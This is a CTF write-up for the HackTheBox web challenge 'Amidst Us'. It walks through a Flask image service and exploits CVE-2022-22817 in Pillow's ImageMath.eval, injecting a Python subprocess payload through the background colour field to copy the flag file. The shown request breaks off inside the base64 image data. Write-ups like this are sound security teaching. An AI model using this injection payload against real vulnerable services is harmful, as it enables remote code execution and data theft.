---
Category:
  - Web
Difficulty: Easy
Platform: HackTheBox
Retired: true
Status: 3. Complete
tags:
  - CVE-2022-22817
  - RCE
  - python-PIL
---
>[!quote]
> The AmidstUs tribe is a notorious group of sleeper agents for hire. We have plausible reasons to believe they are working with Draeger, so we have to take action to uncover their identities. Ulysses and bonnie have infiltrated their HQ and came across this mysterious portal on one of the unlocked computers. Can you hack into it despite the low visibility and get them access?

# Set up

- **Dockerfile**
    
    ```bash
    FROM python:3.7-alpine
    
    # Install packages
    RUN apk add --update --no-cache supervisor python3-dev jpeg-dev libpng-dev freetype-dev gcc musl-dev
    
    # Upgrade pip
    RUN python -m pip install --upgrade pip
    
    # Install dependencies
    RUN pip install Flask
    
    # Add user
    RUN adduser -D -u 1000 -g 1000 -s /bin/sh www
    
    # Copy flag
    COPY flag.txt /flag.txt
    
    # Setup app
    RUN mkdir -p /app
    
    # Switch working environment
    WORKDIR /app
    
    # Add application
    COPY challenge .
    RUN chown -R www:www .
    
    # Install python dependencies
    RUN python -m pip install -r requirements.txt
    
    # Setup supervisor
    COPY config/supervisord.conf /etc/supervisord.conf
    
    # Expose port the server is reachable on
    EXPOSE 1337
    
    # Disable pycache
    ENV PYTHONDONTWRITEBYTECODE=1
    
    # Run supervisord
    CMD ["/usr/bin/supervisord", "-c", "/etc/supervisord.conf"]
    ```
    
- **requirements.txt**
    
    ```
    wheel
    Pillow==8.4.0
    ```
    
- **build-docker.sh**
    
    ```bash
    #!/bin/bash
    docker rm -f web_amidst_us
    docker build --tag=web_amidst_us .
    docker run -p 1337:1337 --rm --name=web_amidst_us web_amidst_us
    ```
    
    ```python
    ┌──(maoutis㉿kali)-[~/CTF/HTB-CA/AmidstUs/web_amidst_us]
    └─$ ./build-docker.sh
    ...
    Successfully built e94d38d7b20d
    Successfully tagged web_amidst_us:latest
    2022-05-17 08:09:08,831 INFO Set uid to user 0 succeeded
    2022-05-17 08:09:08,833 INFO supervisord started with pid 1
    2022-05-17 08:09:09,838 INFO spawned: 'flask' with pid 7
     * Serving Flask app 'application.main' (lazy loading)
     * Environment: production
       WARNING: This is a development server. Do not use it in a production deployment.
       Use a production WSGI server instead.
     * Debug mode: off
     * Running on all addresses (0.0.0.0)
       WARNING: This is a development server. Do not use it in a production deployment.
     * Running on http://127.0.0.1:1337
     * Running on http://172.17.0.2:1337 (Press CTRL+C to quit)
    2022-05-17 08:09:11,067 INFO success: flask entered RUNNING state, process has stayed up for > than 1 seconds (startsecs)
    172.17.0.1 - - [17/May/2022 08:11:19] "GET / HTTP/1.1" 200 -
    ```
    

# Information Gathering

## Source Code

- **run.py**
    
    ```python
    from application.main import app
    
    app.run(host='0.0.0.0', port=1337, debug=False)
    ```
    
- **main.py**
    
    ```python
    from flask import Flask, jsonify
    from application.blueprints.routes import web, api
    
    app = Flask(__name__)
    app.config.from_object('application.config.Config')
    
    app.register_blueprint(web, url_prefix='/')
    app.register_blueprint(api, url_prefix='/api')
    
    @app.errorhandler(404)
    def not_found(error):
        return jsonify({'error': 'Not Found'}), 404
    
    @app.errorhandler(403)
    def forbidden(error):
        return jsonify({'error': 'Not Allowed'}), 403
    
    @app.errorhandler(400)
    def bad_request(error):
        return jsonify({'error': 'Bad Request'}), 400
    ```
    
- **blueprints/routes.py**
    
    ```python
    from flask import Blueprint, request, render_template, abort
    from application.util import make_alpha
    
    web = Blueprint('web', __name__)
    api = Blueprint('api', __name__)
    
    @web.route('/')
    def index():
    	return render_template('index.html')
    
    @api.route('/alphafy', methods=['POST'])
    def alphafy():
    	if not request.is_json or 'image' not in request.json:
    		return abort(400)
    
    	return make_alpha(request.json)
    ```
    
- **config.py**
    
    ```python
    from application.util import generate
    
    class Config(object):
        SECRET_KEY = generate(50)
    
    class ProductionConfig(Config):
        pass
    
    class DevelopmentConfig(Config):
        DEBUG = True
    
    class TestingConfig(Config):
        TESTING = True
    ```
    
- **util.py**
    
    ```python
    import os, base64
    from PIL import Image, ImageMath
    from io import BytesIO
    
    generate = lambda x: os.urandom(x).hex()
    
    def make_alpha(data):
    	color = data.get('background', [255,255,255])
    
    	try:
    		dec_img = base64.b64decode(data.get('image').encode())
    
    		image = Image.open(BytesIO(dec_img)).convert('RGBA')
    		img_bands = [band.convert('F') for band in image.split()]
    
    		alpha = ImageMath.eval(
    			f'''float(
    				max(
    				max(
    					max(
    					difference1(red_band, {color[0]}),
    					difference1(green_band, {color[1]})
    					),
    					difference1(blue_band, {color[2]})
    				),
    				max(
    					max(
    					difference2(red_band, {color[0]}),
    					difference2(green_band, {color[1]})
    					),
    					difference2(blue_band, {color[2]})
    				)
    				)
    			)''',
    			difference1=lambda source, color: (source - color) / (255.0 - color),
    			difference2=lambda source, color: (color - source) / color,
    			red_band=img_bands[0],
    			green_band=img_bands[1],
    			blue_band=img_bands[2]
    		)
    
    		new_bands = [
    			ImageMath.eval(
    				'convert((image - color) / alpha + color, "L")',
    				image=img_bands[i],
    				color=color[i],
    				alpha=alpha
    			)
    			for i in range(3)
    		]
    
    		new_bands.append(ImageMath.eval(
    			'convert(alpha_band * alpha, "L")',
    			alpha=alpha,
    			alpha_band=img_bands[3]
    		))
    
    		new_image = Image.merge('RGBA', new_bands)
    		background = Image.new('RGB', new_image.size, (0, 0, 0, 0))
    		background.paste(new_image.convert('RGB'), mask=new_image)
    
    		buffer = BytesIO()
    		new_image.save(buffer, format='PNG')
    
    		return {
    			'image': f'data:image/png;base64,{base64.b64encode(buffer.getvalue()).decode()}'
    		}, 200
    
    	except Exception:
    		return '', 400
    ```
    

## Screenshots

![File upload](../../zzz_res/attachments/Amidst%20Us%2091d8f3f71975446faf95680b7144c281.png)

File upload

![Amidst%20Us%2091d8f3f71975446faf95680b7144c281](../../zzz_res/attachments/Amidst%20Us%2091d8f3f71975446faf95680b7144c281%201.png)

![Amidst%20Us%2091d8f3f71975446faf95680b7144c281](../../zzz_res/attachments/Amidst%20Us%2091d8f3f71975446faf95680b7144c281%202.png)

![Color palette chooser](../../zzz_res/attachments/Amidst%20Us%2091d8f3f71975446faf95680b7144c281%203.png)

Color palette chooser

Application only accepts images, then it returns the same image and also a negative copy of the same

```
POST /api/alphafy HTTP/1.1
Host: 127.0.0.1:1337
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://127.0.0.1:1337/
Content-Type: application/json
Origin: http://127.0.0.1:1337
Content-Length: 9863
Connection: close

{"image":"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7b9J9WnNNorvXn5+xctltooq2ESxuGYWEjPrMd4jlyO5bMuK+K3Db/amyViJ3jomVrYIqq77uq8TMf5YeMjw0FziAACSToABvJKRG/KGxnOI7QuqqsCAfQR3DnEd77vn/OmtrjwRix/i6y34LTNuGnTxn6OhYpr45oIIO46HzQ235ITZmJvZvY5rS5krm3IBPD9bqRnmd4mPGETSVjhmJjpKzOo8kZmncIYm73O3nkGt3k8gonHvPDXnLbk1FKQ+7GYUaqpGIyRlkEdxRsd3nHjK7n8r2to3WzwYuCvPqotXqZvOzRFvQBAQEBAQEBAQEBAQEBAQEBAQEEbtJWNipKmR7g0CKQAn7RaQwDmSSBZJZUje0Qo+xUeWggBG/tD5GR5B91lzOvnfUW937Q6fTf44+/FNqI3oHaCaSWWHD6c2km77vsR65jp4B3kLcVZdnaaL27y3SOnt/hC1ufu67Ql5fR82Ls5KCpkp52NDc98wk55xwvyHs/wq7vjreNrRupI1E+L0ZjOMQezLQw1IH14nhhPUX/8AUKDfs6k/lmY/Vsi9J8XPLj+JyE5MHLSftyi3xy/NYR2bHjafg3RqKVjbd+P+Fa2sI/aFS1kVwTBBxt9px09+byUzDpceLnWOfm1X1W/RE7WYCMOljqYL+rSFscrCS7I62jgTrY2J143HEWzy4+KG7Raqa25/f+noq5fiCK2arKplVV09HFE6R8hfeRwblAJuQCQT3huvw0Um2nrmivFPSFLnyd3e2/mt1DsQ+WRs+JVHbuGrYm6RN+V+gAvxupGLBTHG1YQMmpm3RdWtAAAAAAAAGgAG4ALcjPqAgICAgICAgICAgICAgICAgICDMNr6LEKmru6idJTxPd2MYewMeBoJHG9yTytoNOd9eStrRMRO3qmYL4qbTPN6ifEv7K/7rVV/2qP/AFPw/lY/3KvoesYl/ZR/vWp/aq/+p+H8n9yr6O7YrC6n1+orKqmMV4Wxxgua7i29rH+H4qw02CMNIpCv1eojLO8L4pCEICAghdssOdUUNTCxuZ5YCwXAu5rg5up8Qks8duG0Sz2nocRaxrf2c45WtF87NbC196iTp953XNe0YiIjk9PVcR/s1352f6rz+m9WX9zr5R+v0cdZguIvfHMygfHKwgska9lxbhv1/wB+a248c08UfPq8eXrs1TAZ5n08T6mIRzEHtGggi4JAOhNrgA2vpey3wq7RETySCMRAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEH/2Q==","background":[255,255,255]}
```

![Amidst%20Us%2091d8f3f71975446faf95680b7144c281](../../zzz_res/attachments/Amidst%20Us%2091d8f3f71975446faf95680b7144c281%204.png)

![Amidst%20Us%2091d8f3f71975446faf95680b7144c281](../../zzz_res/attachments/Amidst%20Us%2091d8f3f71975446faf95680b7144c281%205.png)

# The Bug - ****Arbitrary Code Execution in Pillow (****CVE-2022-22817)

[Arbitrary Code Execution in pillow | CVE-2022-22817 | Snyk](https://security.snyk.io/vuln/SNYK-PYTHON-PILLOW-2331901)

[CVE - CVE-2022-22817](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-22817)

PIL.ImageMath.eval in Pillow before 9.0.0 allows evaluation of arbitrary expressions, such as ones that use the Python exec method. A lambda expression could also be used,

# Exploitation

```python
"__import__('subprocess').getoutput('cp /flag.txt /app/application/static/uploads/flag.txt')"
```

```
POST /api/alphafy HTTP/1.1
Host: 127.0.0.1:1337
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://127.0.0.1:1337/
Content-Type: application/json
Origin: http://127.0.0.1:1337
Content-Length: 9949
Connection: close

{"image":"/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEAAkGBxQTEBAQEhAVFhUXExAVEhgYFxgWGBgYGBUWGRUXGBgYHyggGxsxHRcYJjEiJSktLjAuGCAzODMuOCgtLisBCgoKDg0OGhAQGismICUvLS0tKy0tLS0yLS8vLS0tLS8tLS0tLS0tLS0tMC0tLS0tLS0tLS8tLS0tLS0vLS0tLf/AABEIAMIBAwMBEQACEQEDEQH/xAAbAAEAAwEBAQEAAAAAAAAAAAAABQYHBAMBAv/EAEUQAAEDAgMFBAYHBAgHAAAAAAEAAgMEEQUSIQYxQVFxEzJhgQcUIpGhsSNCUnKCksEVM2LwJFNVk6Ky0fEWNXOjs8LS/8QAGgEBAAIDAQAAAAAAAAAAAAAAAAQFAgMGAf/EADURAQACAQIDBQYFBAMBAQAAAAABAgMEERIhMQUTQVFhcYGRwdHwIjKhseEUFTPxI0JScmL/2gAMAwEAAhEDEQA/ANEXgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIKTivpDZFPLG2lkkiif2c8oNg117EBttdbjUi9ul8JyVi0V35pNNNa1eJc4ZQ9rXtN2uaHNI3EEXB9yzRn7QVPanbVtLMKdlO6aQMD5AHZQxvWxJNtbW4jXVY2tEdW/Fgtk5wncDxVlVTx1Ed8rwdDvBBIc09CCsoarVms7S70YiAgICAgICAgICAgICAgICAgICAgICAgICAgIMtloQMRxWjdo2YCVv4xdzh+KT/CqvtHek0yx4T9/su9BMXpNJ8YWL0Y4iX0jqaQ/SUz3ROH8Nzk8tHNH3FZUtFqxMKvUUmt1tmlaxrnuNmta5zjyAFyfcFk0xzYo6sdIyur36OmL8l/qt7rR5aD8CiZJ4skVX2np3eC1vd9+9qGwtH2WHUjLWJjEh6yEyH/NbyUqOikyzveU8vWsQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAsgICDPtso+yxahn4TRSQu6tJt8Xt9yha+nFgt8fgsuzr7X2++bgdXGgxE1PZSPhniLZWxi5zttY2Ol9BvP1nLR2dqInHw2np+yRr9PNp3jxfdqduRU00lLBTzsfIWsJe1oGUkZhoTv3dCVYTkrt1QsWlvFoQmM0v0NPSM3ySRRDzNr/mIKi4fxXmVvq9seGKx97NoYwNAaNwAA6DQKc5t+kABAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQRm0eLClpZqg29hvsA/WedGN/MR5XSWVK8VtmU1sM8VM3EX1kwqSWPHtae064bl+7rl3aEWsq2mstfUTjrHKN+fs+W65tpaVxcU/BsdHI50cbntyuLGFw5EtBI96slLPV7I8UP0mOzTYXCO8agyX4hrMl/nf8ACtGptFcVpnylN0NZnJ8Hddco6NC1p+kf1/RW2D/HDJE1Lwytw2V2rW1DWnkMzmgHy3+Sn6aecq7tGszSJ9rXlNc8IMw28mkmxEUj5ZI4mwtexrDlzuO9x5neNd2Q23lac15rG8LLQYaZJ2lJ+jnGJBJPh88jnuZ7cDnEkmPS7bnfa7T5kbgssd+KN2nWYO7svi2IYgICAgICAgICAgICAgICAgICAg/Mjw0FziAACSSbAAakkncEGY49i37TmaxgtRQSZ5JHadq4DcAeFiRbk65toFE1Oea/gpzvPSI/dZabBFInJknasdZnwej6f1rFaald+7hZ6w8H65BGUW4i+UdC5ROy8URSb+M/JJ7RyzHKPvdpitlIIM72lcZMbib/AFNIXNvuDnFwv/jb7lX9pX4cM+sxHz+S17Nrvbf2vfC6t7s8UzMlRE7JOzk7eHD+EjUKn1WnnDfbwnp9+cLTBmjLXfxcde4